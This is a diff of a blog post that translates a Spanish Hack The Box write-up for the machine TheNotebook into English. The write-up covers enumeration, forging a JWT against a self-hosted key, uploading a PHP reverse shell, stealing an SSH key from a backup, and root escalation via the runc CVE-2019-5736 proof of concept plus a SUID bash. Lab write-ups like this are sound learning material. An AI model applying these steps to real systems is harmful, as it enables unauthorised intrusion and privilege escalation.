@@ -1,6 +1,6 @@
 ---
 layout: post
-title:  "☢HTB☢ TheNotebook"
+title:  "[HTB] TheNotebook"
 date:   2021-07-31 9:20:00 +0200
 last_modified_at: 2021-07-31 09:20:29 +0200
 toc:  true
@@ -9,14 +9,15 @@ categories: Hackthebox
 ---
 
 
-{: .message}
+It's a machine that I really liked the way it intruded and climbed.
 
-Es una máquina que realmente me gusto por la forma de intrusión y la escalada.
+---
 
-## Enumeración
+
+## Enumeration
 ### Nmap 
 
-*Puertos:*
+*Ports:*
 * 22 /tcp -> OpenSSH 7.6p1
 * 80 /tcp -> nginx 1.14.0
 
@@ -45,7 +46,8 @@ PORT   STATE SERVICE
 Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 97.78 seconds
 ```
-Este escaneo como siempre digo es el importante ya que nos trae versiones de los servicios:
+This scan as I always say is the important one since it brings us versions of the services:
+
 ```bash
 nmap -sC -sV -p22,80 10.10.10.230 -oN ScanPort1
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-21 21:22 EDT
@@ -66,7 +68,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 11.90 seconds
 ```
-Siempre me gusta tirar de esta utilidad para saber a qué me enfrento:
+I always like to pull this utility to know what I'm up against:
 
 ```bash
 whatweb 10.10.10.230
@@ -75,17 +77,17 @@ http://10.10.10.230 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer
 
 ### Fuzz
 
-Mediante wfuzz pude sacar esto: 
+Through wfuzz I was able to get this: 
 * -> http://10.10.10.230/bd7077f7-3d3a-43c0-a0e0-20047e819f35/notes
 * -> http://10.10.10.230/admin/
 	* upload
 	* notes
 
 
-En el cookie editor encontre lo que es una jwt que cuando se pasa por [esto](https://jwt.io/) y te muestra todo lo que necesitas para trabajar
+In the cookie editor I found what is a jwt which when passed by [this](https://jwt.io/) and shows you everything you need to work
 
 ## JWT Token bypass
-Para llevar a cabo este bypass me lei este [blog](https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a)
+To perform this bypass I read this one [blog](https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a)
 ```sql
 ssh-keygen -t rsa -b 4096 -m PEM -f privKey.key
 Generating public/private rsa key pair.
@@ -121,19 +123,19 @@ eyJ1c2VybmFtZSI6ImJlbmppIiwiZW1haWwiOiJiZW5qaUBodGIubG9jYWwiLCJhZG1pbl9jYXAi
 OnRydWV9Cg==
 ```
 
-Primero se copia los dos base64 que se obtuvieron de la codificacion de las cadenas de texto. (Teniendo en cuenta que tengo un servidor en el puerto 7070)
+First we copy the two base64 that were obtained from the encoding of the text strings. (Taking into account that I have a server on port 7070)
 
 ![](/images_blog/img_thenotebook/Pastedimage20210422141532.png)
 
 ![Pastedimage20210422141532](https://user-images.githubusercontent.com/76759292/127757368-0953690d-dca7-4a53-95e4-ca1a1caea03f.png)
 
-### Firma del token 
+### Sign token 
 
-Para hacerlo tienes que copiar  la clave publica y la privada en https://jwt.io/.
+To do this you have to copy the public and private keys to https://jwt.io/.
 
 ## Reverse PHP
 
-Aqui tengo acceso a subir un archivo php y entonces aprovechando esto, subiendo el clasico php
+Here I have access to upload a php file and then taking advantage of this, uploading the classic php file
 
 ![](/images_blog/img_thenotebook/Pastedimage20210422142431.png)
 ![Pastedimage20210422142431](https://user-images.githubusercontent.com/76759292/127757445-cabf92e0-48fd-475b-833f-d69f2afa637a.png)
@@ -148,7 +150,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@thenotebook:/$ 
 ```
 
-Primero es que nos encontramos como el usuario www-data tenemos que volvernos el usuario noah, en la ruta de backup nos encontramos con uno del diretorio completo de noah, este backup contiene una clave id_rsa del usuario noah:
+First is that we find as the user www-data we have to become the user noah, in the backup path we find one of the full directory of noah, this backup contains an id_rsa key of the user noah:
 
 ```bash
 /var/backups$ ls -la
@@ -167,7 +169,7 @@ ls
 authorized_keys  id_rsa  id_rsa.pub
 ```
 
-Teniendo esto entramos por ssh:
+Having this we log in via ssh:
 ```bash
 noah@thenotebook:~$ ls
 user.txt  webapp-dev01.sh
@@ -175,7 +177,8 @@ noah@thenotebook:~$ cat user.txt
 56013079b3c02c282d699ba6faec07c6
 ```
 ## PrivEsc
-Para el privesc nos encontramos un contenedor que se encuentra desactualizado con una version *Docker version 18.06.0-ce* cabe destacar que docker va por la version 20.10:
+For the privesc we found a container that is outdated with a version *Docker version 18.06.0-ce* it is worth noting that docker is on version 20.10:
+
 ```bash
 noah@thenotebook:~$ sudo -l
 Matching Defaults entries for noah on thenotebook:
@@ -191,13 +194,13 @@ root@b778c5e32326:/opt/webapp#
 docker --version
 Docker version 18.06.0-ce, build 0ffa825
 ```
-Aqui les dejo este [CVE](https://github.com/Frichetten/CVE-2019-5736-PoC):
+Here is this one [CVE](https://github.com/Frichetten/CVE-2019-5736-PoC):
 
 ![](/images_blog/img_thenotebook/Pastedimage20210731171252.png)
 ![Pastedimage20210731171252](https://user-images.githubusercontent.com/76759292/127757457-ae1380af-2ede-4b74-a348-9a65d799c412.png)
 
 
-La idea es que podemos ejecutar cualquier comando como root entonces sabiendo esto le dare permiso a la bash para cuando haga un bash -p me de una bash como root:
+The idea is that we can execute any command as root so knowing this I will give permission to the bash so when I do a bash -p it will give me a bash as root:
 
 ```bash
 ls -la /bin/bash
@@ -211,7 +214,7 @@ ls -la /bin/bash
 
 ![Pastedimage20210731171815](https://user-images.githubusercontent.com/76759292/127757461-a85dc410-c881-4325-82fc-59a60ffe4a8f.png)
 
-Aqui vemos como tenemos acceso a la flag:
+Here we see how we have access to the flag:
 ```bash
 bash-4.4# ls
 cleanup.sh  docker-runc  reset.sh  root.txt  start.sh
@@ -220,4 +223,8 @@ bash-4.4# cat root.txt
 bash-4.4# 
 ```
 MACHINE PWNED!!!!!
+
+<p align="center">
+<img src="https://tenor.com/view/typing-petty-fast-cloudy-with-a-chance-of-meatballs-flint-lockwood-gif-4907824.gif" width="200" height="200" />
+</p>
 
